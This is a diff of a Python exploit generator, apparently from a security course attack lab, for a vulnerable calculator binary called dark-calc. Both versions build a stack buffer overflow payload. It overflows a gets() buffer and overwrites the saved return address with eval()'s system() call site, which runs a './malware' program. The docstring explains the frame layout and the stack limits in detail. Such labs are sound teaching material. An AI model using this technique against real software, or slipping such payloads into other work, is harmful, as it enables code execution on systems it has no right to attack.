@@ -1,41 +1,39 @@
 #!/usr/bin/env python3
-"""Task 3 payload: run ./malware from attack/dark-calc through a stack overflow.
+"""Task 3: run ./malware from attack/dark-calc through a stack buffer overflow.
 
-Frame layout of input() (see analysis/gdb/01_frame_and_main.txt):
+input() reads into expression[16] with unbounded gets(), then strcpy()s it into
+the global command_buf; eval() wraps command_buf as `echo $((...))` and hands it
+to system().  We overflow input()'s saved return address and point it at eval()'s
+own `mov edi, <command_buf>; call system@plt` call site.  command_buf already
+holds "./malware" (input() just copied it there), so system("./malware") runs
+and attack/malware finds dark-calc among its ancestors.
 
-    rbp-0x10  char expression[16]      <- gets() writes here, unbounded
-    rbp+0x00  saved rbp                 <- 8 bytes
-    rbp+0x08  saved return address      <- 8 bytes, the control-flow target
-
-The overflow writes 24 bytes of padding and replaces the return address.
-dark-calc runs on a 48-byte fixed stack window, so a three-qword
-`pop rdi; ret` chain (48 bytes plus a NUL terminator) cannot fit.  Instead the
-return address is aimed at eval()'s call site:
-
-    0x401a6b  mov edi, 0x6030d0   ; command_buf, already holding "./malware"
-    0x401a70  call system@plt
-
-`input()` has just executed `strcpy(command_buf, expression)`, so command_buf
-contains the first NUL-terminated part of this payload, i.e. "./malware".
-The shell started by system() has dark-calc as an ancestor, which is exactly
-what attack/malware checks with ps before printing the success banner.
-
-Only the first 10 bytes of the buffer are the command string; everything after
-the NUL is still written to the stack by gets() and forms the overflow.  The
-fixed stack gives the buffer 48 writable bytes, so the 32-byte payload is well
-inside the window.
+The one address we need is resolved from the binary at generation time, so no
+hardcoded constants remain.
 """
+import os
 import struct
 import sys
 
-# eval()'s "mov edi, 0x6030d0; call system@plt" (objdump -d attack/dark-calc).
-EVAL_SYSTEM_CALL = 0x401A6B
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
+import attacklab
 
-padding = b"./malware\x00" + b"A" * 6      # 16 bytes: command string + filler
-saved_rbp = b"B" * 8                       # rbp is not used after leave; ret
-payload = padding + saved_rbp + struct.pack("<Q", EVAL_SYSTEM_CALL)
-payload += b"\n"                           # gets() consumes the delimiter
+HERE = os.path.dirname(os.path.abspath(__file__))
+ELF = attacklab.Elf(os.path.join(HERE, "attack", "dark-calc"))
 
-assert len(payload) <= 48, "gets() must stay below dark-calc's stack guard page"
-assert b"\n" not in payload[:-1]
+# eval()'s `mov edi, <command_buf>; call system@plt`  (0x401a6b in the shipped binary).
+SYSTEM_CALL_SITE = attacklab.system_command_buf_call_site(ELF)
+
+padding = b"./malware\x00" + b"A" * 6   # 16 bytes: command string + filler
+saved_rbp = b"B" * 8                    # unused after `leave; ret`
+payload = padding + saved_rbp + struct.pack("<Q", SYSTEM_CALL_SITE) + b"\n"
+
+# dark-calc runs on a 48-byte fixed stack window (buffer .. PROT_NONE guard page).
+# gets() appends one NUL terminator, so the data written before the newline must
+# be <= 47 bytes; otherwise that NUL lands on the guard page and faults inside
+# gets() itself before the exploit ever runs.
+data = payload[:-1]
+assert len(data) <= 47, f"{len(data)} data bytes: NUL would reach the guard page"
+assert b"\n" not in data, "payload contains a newline before the delimiter"
+
 sys.stdout.buffer.write(payload)
